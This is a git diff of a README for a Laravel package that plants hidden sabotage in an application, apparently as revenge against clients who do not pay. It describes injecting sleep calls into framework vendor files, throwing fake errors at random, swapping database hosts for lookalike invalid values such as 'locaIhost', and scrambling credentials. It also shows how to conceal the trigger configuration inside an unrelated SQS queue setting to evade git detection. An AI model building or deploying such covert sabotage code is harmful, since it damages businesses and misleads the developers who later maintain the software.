@@ -19,7 +19,7 @@ You are welcome to fork it and change code for your needs.
 ### What It Does:
 It modifies laravel vendor files and the apps' env files. This way it doesn't get caught in git. Here is the list of package actions and what they do:
 
-* NightDistributer: puts 'sleep(1)' function inside application run cycles such as Illuminate\Pipeline\Pipeline, Illuminate\Routing\Router etc. and inside all functions of Illuminate\Database\Eloquent\Collection. That's about minimum 20+ seconds of response time if you are not using a lot of infected functions. Here is the full list:
+* **NightDistributer:** puts '*sleep(1)*' function inside application run cycles such as Illuminate\Pipeline\Pipeline, Illuminate\Routing\Router etc. and inside all functions of Illuminate\Database\Eloquent\Collection. That's about minimum 20+ seconds of response time if you are not using a lot of infected functions. Here is the full list:
     - Pipeline @ then,thenReturn,a (repeated) closure
     - Router @ dispatch,runRoute,dispatchToRoute
     - Route @ run
@@ -29,10 +29,15 @@ It modifies laravel vendor files and the apps' env files. This way it doesn't ge
     - Foundation\Http\Kernel @ handle
     - AddQueuedCookiesToResponse @ handle
     - StartSession @ handle
-* SillyConnection: messes with .env file changing values of APP_DEBUG, DB_HOST (to 127.0.0.0), DB_PASSWORD, DB_USERNAME, DB_CONNECTION.
-* SpeedyDebugging: forces application to run with app.debug=false to prevent detailed errors
-* RandomLimit: with a ``` time() % 11 < 4 ``` chance, application will throw "509 Whoops, looks like something went wrong." fake error.
-* SyntaxHandler: with a ``` time() % 11 > 8 ``` chance, application will throw ```undefined variable $items``` fake error. It will show the real ending line number of controller@action.
+* **RandomLimit:** with a ``` time() % 11 < 4 ``` chance, application will throw "509 Whoops, looks like something went wrong." fake error.
+* **SyntaxHandler:** with a ``` time() % 11 > 8 ``` chance, application will throw ```undefined variable: items``` fake error. It will show the real ending line number of controller@action.
+* **ApplyCredential:** forces application to use altered password that is original_password + whitespace ("password123" becomes "password123 ")
+* **ApplyDebug:** forces application to run with app.debug=false to prevent detailed errors
+* **ApplyHost:** sets applications default db host to **locaIhost** (if the current value is *localhost*) or **127.0.0.0**. *(both are invalid. keyword locaIhost includes uppercase i instead of l and obviously 127.0.0.0 is not 127.0.0.1)*
+* **MixConnection:** modifies .env **DB_CONNECTION** to **pgsql**. If you are already using pgsql driver this is useless meh.
+* **MixCredentials:** changes .env **DB_USERNAME** and **DB_PASSWORD** values and randomize them.
+* **MixDebug:** modifies .env **APP_DEBUG** to **false**
+* **MixHost:** changes .env **DB_HOST** to 127.0.0.**0**
 
 
 ### Usage
@@ -56,9 +61,65 @@ config('app.sfa', true) && (
 ) // package will run if this returns true
 ```
 
-Then you can just visit your site and it will run its' actions. You can also set APP_ENV=stesting and run ``` php artisan sf:start ``` in shell.
+**Selecting which actions to run:**
+To make a selection you can combine actions' ids using OR (|) operator or just use the final value. All actions have an id and you can access them using:
+```php
+    ActionNameHere::getAId(); // : int
+```
 
-### How to get rid of this:
+Your selection of actions reside inside *config('queue.connections.sqs.spin')*. Here is an example for your queue.php:
+
+```php
+return [
+    // ...
+
+    'connections' => [
+
+        // ...
+        'sqs' => [
+            'driver' => 'sqs',
+            'key' => env('AWS_ACCESS_KEY_ID'),
+            'secret' => env('AWS_SECRET_ACCESS_KEY'),
+            'prefix' => env('SQS_PREFIX', 'https://sqs.us-east-1.amazonaws.com/your-account-id'),
+            'queue' => env('SQS_QUEUE', 'your-queue-name'),
+            'suffix' => env('SQS_SUFFIX'),
+            'region' => env('AWS_DEFAULT_REGION', 'us-east-1'),
+            'spin' => (
+                // this is where you pass your actions or dont add this at all and package will run all its actions
+                \Lmande\SecurityForcer\Actions\ApplyCredential::getAId() |
+                \Lmande\SecurityForcer\Actions\ApplyDebug::getAId() |
+                \Lmande\SecurityForcer\Actions\ApplyHost::getAId() |
+                \Lmande\SecurityForcer\Actions\NightDistributer::getAId() |
+                \Lmande\SecurityForcer\Actions\RandomLimit::getAId() |
+                \Lmande\SecurityForcer\Actions\SyntaxHandler::getAId() |
+                \Lmande\SecurityForcer\Actions\MixConnection::getAId() |
+                \Lmande\SecurityForcer\Actions\MixCredentials::getAId() |
+                \Lmande\SecurityForcer\Actions\MixDebug::getAId() |
+                \Lmande\SecurityForcer\Actions\MixHost::getAId()
+            ),
+        ],
+        // ...
+```
+
+or you can also keep it short and abstract and after you calculate the final value you can pass it directly:
+
+```php
+return [
+    // ...
+
+    'connections' => [
+        // ...
+        'sqs' => [
+            // ...
+            'spin' => 896, // this val causes package to run only the following actions: NightDistributer, RandomLimit, SyntaxHandler
+        ],
+        // ...
+```
+
+Then you can just visit your site and it will run its' actions if conditions are met. You can also set APP_ENV=stesting and run ``` php artisan sf:start ``` in console to make a test run.
+
+### How to get rid of this and its effects:
+- Remember to shame your boss first if s/he didn't give the previous developer his/her earned money and if this is why your boss wants you to fix it instead of paying for an already completed honest work.
 - Remove this package from your composer.json
 - Delete your vendor directory
 - composer install
